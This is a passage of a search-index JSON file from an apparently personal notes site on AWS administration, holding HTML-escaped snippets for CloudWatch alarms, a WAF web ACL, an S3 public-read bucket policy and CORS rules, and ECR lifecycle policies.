style=\"color:#e6db74\"\u003e}\u003c/span\u003e|awk -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;,\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $1}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    VALUE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eecho \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eline\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e|awk -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;,\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    aws cloudwatch put-metric-alarm \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --alarm-name \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eID\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e_netout \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --metric-name NetworkOut \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --namespace AWS/EC2 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --statistic Average \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --period \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --threshold \u003cspan style=\"color:#ae81ff\"\u003e2560000\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --comparison-operator GreaterThanOrEqualToThreshold \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --dimensions  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Name=InstanceId,Value=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eVALUE\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --evaluation-periods \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --alarm-actions arn:aws:sns:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eregion\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eaccount_id\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003etopic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e##--unit Bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$ID\u003cspan style=\"color:#e6db74\"\u003e done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eWAF\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws wafv2 create-web-acl \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --name acl_name \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --scope CLOUDFRONT \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --default-action Allow\u003cspan style=\"color:#f92672\"\u003e={}\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --visibility-config SampledRequestsEnabled\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue,CloudWatchMetricsEnabled\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue,MetricName\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emetric_acl_name \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --rule\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMount S3 Bucket on EC2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003ereferences: \u003ca href=\"https://linuxbeast.com/blog/how-to-mount-s3-bucket-on-ubuntu-22-04-with-s3fs-fuse/\" target=\"_blank\" rel=\"noopener\"\u003eHow to Mount S3 Bucket on Ubuntu 22.04 with S3FS Fuse\u003c/a\u003e\u003c/p\u003e","tags":null,"title":"AWS Command"},{"categories":null,"contents":" S3 Bucket Policy { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;AllowPublicRead\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;s3:GetObject\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::bucketName/*\u0026#34; } ] } S3 CORS [ { \u0026#34;AllowedHeaders\u0026#34;: [\u0026#34;*\u0026#34;], \u0026#34;AllowedMethods\u0026#34;: [\u0026#34;GET\u0026#34;, \u0026#34;PUT\u0026#34;, \u0026#34;POST\u0026#34;, \u0026#34;DELETE\u0026#34;], \u0026#34;AllowedOrigins\u0026#34;: [\u0026#34;*\u0026#34;], \u0026#34;ExposeHeaders\u0026#34;: [ \u0026#34;x-amz-server-side-encryption\u0026#34;, \u0026#34;x-amz-request-id\u0026#34;, \u0026#34;x-amz-id-2\u0026#34; ], \u0026#34;MaxAgeSeconds\u0026#34;: 3000 } ] ECR Lifecycle Policy { \u0026#34;rules\u0026#34;: [ { \u0026#34;rulePriority\u0026#34;: 1, \u0026#34;description\u0026#34;: \u0026#34;Keep only the last 100 images\u0026#34;, \u0026#34;selection\u0026#34;: { \u0026#34;tagStatus\u0026#34;: \u0026#34;any\u0026#34;, \u0026#34;countType\u0026#34;: \u0026#34;imageCountMoreThan\u0026#34;, \u0026#34;countNumber\u0026#34;: 100 }, \u0026#34;action\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;expire\u0026#34; } } ] } ECR Lifecycle Policy1 { \u0026#34;rules\u0026#34;: [ { \u0026#34;rulePriority\u0026#34;: 1, \u0026#34;description\u0026#34;: \u0026#34;Remove images with certain tag\u0026#34;, \u0026#34;selection\u0026#34;: { \u0026#34;tagStatus\u0026#34;: \u0026#34;tagged\u0026#34;, \u0026#34;tagPrefixList\u0026#34;: [\u0026#34;tag1\u0026#34;, \u0026#34;tag2\u0026#34;], \u0026#34;countType\u0026#34;: \u0026#34;imageCountMoreThan\u0026#34;, \u0026#34;countNumber\u0026#34;: 0 }, \u0026#34;action\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;expire\u0026#34; } } ] } ECR Lifecycle Policy2 { \u0026#34;rules\u0026#34;: [ { \u0026#34;rulePriority\u0026#34;: 1, \u0026#34;description\u0026#34;: \u0026#34;Remove untagged images older than 14 days\u0026#34;, \u0026#34;selection\u0026#34;: { \u0026#34;tagStatus\u0026#34;: \u0026#34;untagged\u0026#34;, \u0026#34;countType\u0026#34;: \u0026#34;sinceImagePushed\u0026#34;, \u0026#34;countUnit\u0026#34;: \u0026#34;days\u0026#34;, \u0026#34;countNumber\u0026#34;: 14 }, \u0026#34;action\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;expire\u0026#34; } } ] } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/aws/configure/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eS3 Bucket Policy\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2012-10-17\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Statement\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Sid\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AllowPublicRead\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Principal\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;s3:GetObject\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;arn:aws:s3:::bucketName/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eS3 CORS\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;AllowedHeaders\u0026#34;\u003c/span\u003e: [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;AllowedMethods\u0026#34;\u003c/span\u003e: [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;GET\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;PUT\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;POST\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DELETE\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;AllowedOrigins\u0026#34;\u003c/span\u003e: [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;ExposeHeaders\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;x-amz-server-side-encryption\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;x-amz-request-id\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;x-amz-id-2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;MaxAgeSeconds\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e3000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eECR Lifecycle Policy\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rules\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rulePriority\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;description\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Keep only the last 100 images\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;selection\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;tagStatus\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;any\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countType\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;imageCountMoreThan\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countNumber\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;action\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;expire\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eECR Lifecycle Policy1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rules\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rulePriority\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;description\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Remove images with certain tag\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;selection\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;tagStatus\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tagged\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;tagPrefixList\u0026#34;\u003c/span\u003e: [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tag1\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tag2\u0026#34;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countType\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;imageCountMoreThan\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;countNumber\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;action\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;expire\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eECR Lifecycle Policy2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rules\u0026#34;\u003c/span\u003e: [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;rulePriority\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;description\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Remove untagged images older than 14 days\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;selection\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#f92672\"\u003e\u0026#34;tagStatus\u0026#34;\u003c/span\u003e: \u003cspan 